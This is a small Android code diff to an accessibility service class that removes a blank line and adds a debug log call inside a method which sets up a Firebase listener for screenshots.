@@ -48,7 +48,6 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
         instance = this;
     }
@@ -70,6 +69,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     public void takeScreenshots(String UserID) {
 
+        Log.d(TAG, UserID+"tfggygyg");
         mdb = FirebaseDatabase.getInstance();
         reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");
 
